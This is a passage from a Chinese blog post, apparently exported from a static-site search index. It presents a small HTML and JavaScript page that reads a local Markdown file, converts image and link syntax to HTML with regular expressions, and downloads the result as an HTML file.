class="attribute">font-size</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">overflow</span>: scroll;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.middle</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">125px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: tomato;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;left&quot;</span> <span class="attr">class</span>=<span class="string">&quot;position&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>First:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;readfile&quot;</span> <span class="attr">value</span>=<span class="string">&quot;读取文件&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">id</span>=<span class="string">&quot;getfile&quot;</span>&gt;</span></span><br><span class="line">var file = document.getElementById(&#x27;file&#x27;).files[0];</span><br><span class="line">var oBtn1 = document.getElementById(&#x27;readfile&#x27;);</span><br><span class="line">var oBtn2 = document.getElementById(&#x27;change&#x27;);</span><br><span class="line">var oBtn3 = document.getElementById(&#x27;download&#x27;);</span><br><span class="line">var getFile = document.getElementById(&#x27;getfile&#x27;);</span><br><span class="line">var aftChange = document.getElementById(&#x27;aftChange&#x27;);</span><br><span class="line">oBtn1.onclick = function () &#123;</span><br><span class="line">var reader = new FileReader();</span><br><span class="line">reader.readAsText(file);</span><br><span class="line">reader.onload = function () &#123;</span><br><span class="line">var fileContent = this.result;</span><br><span class="line">getFile.innerHTML = fileContent;</span><br><span class="line">oBtn2.onclick;</span><br><span class="line">oBtn3.onclick;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;center&quot;</span> <span class="attr">class</span>=<span class="string">&quot;position&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Second:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;转换&quot;</span> <span class="attr">id</span>=<span class="string">&quot;change&quot;</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">id</span>=<span class="string">&quot;aftChange&quot;</span>&gt;</span></span><br><span class="line">oBtn2.onclick = function () &#123;</span><br><span class="line">console.log(fileContent);</span><br><span class="line">var imgLink = /!(\[.*\])\((.*)\)/gi;   </span><br><span class="line">var hyperLink = /\[(.*)\]\((.*)\)/gi;</span><br><span class="line">fileContent = fileContent.replace(imgLink, &quot;<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;$2&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;picture&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span>&quot;);     //替换符合正则表达式的内容      </span><br><span class="line">fileContent = fileContent.replace(hyperLink, &quot;<span class="tag">&lt;<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> =<span class="string">&#x27;$2&#x27;</span> <span class="attr">target</span> = <span class="string">&#x27;_blank&#x27;</span>&gt;</span>$1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span>&quot;);</span><br><span class="line">aftChange.innerHTML = fileContent;</span><br><span class="line">console.log(getFile.innerHTML);</span><br><span class="line">&#125;            </span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;right&quot;</span> <span class="attr">class</span>=<span class="string">&quot;position&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Third:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;下载&quot;</span> <span class="attr">id</span>=<span class="string">&quot;download&quot;</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">oBtn3.onclick = function () &#123;            </span><br><span class="line">var funDownload = function (content, filename) &#123;</span><br><span class="line">var eleLink = document.createElement(&#x27;a&#x27;);</span><br><span class="line">eleLink.download = filename;</span><br><span class="line">eleLink.style.display = &#x27;none&#x27;;</span><br><span class="line">var blob = new Blob([content]);</span><br><span class="line">eleLink.href = URL.createObjectURL(blob);</span><br><span class="line">document.body.appendChild(eleLink);</span><br><span class="line">eleLink.click();</span><br><span class="line">document.body.removeChild(eleLink);</span><br><span class="line">&#125;;</span><br><span class="line">funDownload(fileContent,&#x27;test.html&#x27;);</span><br><span class="line">&#125;        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;参考链接：https://www.cnblogs.com/hhhyaaon/p/5929492.html；http://www.zhangxinxu.com/wordpress/2017/07/js-text-string-download-as-html-json-file/;https://taoyouyou.gitee.io/&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;file&#x27;</span>).files[<span class="number">0</span>];  <span class="comment">//选择一个文件</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;readfile&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn2 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;change&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn3 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;download&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> getFile = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;getfile&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> aftChange = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;aftChange&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            oBtn1.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();     <span class="comment">////读取本地文件，以utf-8编码方式输出</span></span></span><br><span class="line"><span class="javascript">                reader.readAsText(file,<span class="string">&#x27;utf-8&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                reader.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;     <span class="comment">// onload 回调函数是在异步请求加载完成后所执行的函数</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> fileContent = reader.result;   <span class="comment">//为读取到的内容附一个变量</span></span></span><br><span class="line"><span class="javascript">                    getFile.innerHTML = fileContent;</span></span><br><span class="line"><span class="javascript">                    oBtn2.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(fileContent);</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> imgLink = <span class="regexp">/!(\[.*\])\((.*)\)/gi</span>;    <span class="comment">//markdown中图片对应的正则表达式</span></span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> hyperLink = <span class="regexp">/\[(.*)\]\((.*)\)/gi</span>;   <span class="comment">//markdown中超链接对应的正则表达式</span></span></span><br><span class="line"><span class="javascript">                        fileContent = fileContent.replace(imgLink, <span class="string">&quot;&lt;img src=&#x27;$2&#x27; alt=&#x27;picture&#x27;&gt;&quot;</span>);     <span class="comment">//替换符合正则表达式的内容      </span></span></span><br><span class="line"><span class="javascript">                        fileContent = fileContent.replace(hyperLink, <span class="string">&quot;&lt;h2&gt;&lt;a herf =&#x27;$2&#x27; target = &#x27;_blank&#x27;&gt;$1&lt;/a&gt;&lt;/h2&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                        aftChange.innerHTML = fileContent;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">// 下载文件方法, 借助HTML5 Blob实现文本信息文件下载</span></span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(fileContent)</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> funDownload = <span class="function"><span class="keyword">function</span> (<span class="params">content, filename</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">var</span> eleLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                            eleLink.download = filename;</span></span><br><span class="line"><span class="javascript">                            eleLink.style.display = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// 字符内容转变成blob地址</span></span></span><br><span class="line"><span class="javascript">                            <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([content]);</span></span><br><span class="line"><span class="javascript">                            eleLink.href = URL.createObjectURL(blob);</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// 触发点击</span></span></span><br><span class="line"><span class="javascript">                            <span class="built_in">document</span>.body.appendChild(eleLink);</span></span><br><span class="line"><span class="javascript">                            eleLink.click();</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// 然后移除</span></span></span><br><span class="line"><span class="javascript">                            <span class="built_in">document</span>.body.removeChild(eleLink);</span></span><br><span class="line"><span class="javascript">                        &#125;;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="string">&#x27;download&#x27;</span> <span class="keyword">in</span> <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// 作为test.html文件下载</span></span></span><br><span class="line"><span class="javascript">                            oBtn3.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                                alert(fileContent);</span></span><br><span class="line"><span class="javascript">                                funDownload(fileContent, <span class="string">&#x27;test.html&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                            &#125;);</span></span><br><span class="line"><span class="javascript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                            oBtn3.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                                alert(<span class="string">&#x27;浏览器不支持&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                            &#125;;</span></span><br><span class="line"><span class="javascript">                        &#125;</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>能力有限，请多指教。当然别忘记点赞哦！！！！！！！！！！！！！<br>@看到这篇文章的所有人</p>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20190224111542616.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzcyODYy,size_16,color_FFFFFF,t_70," alt="100px"></p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
</search>
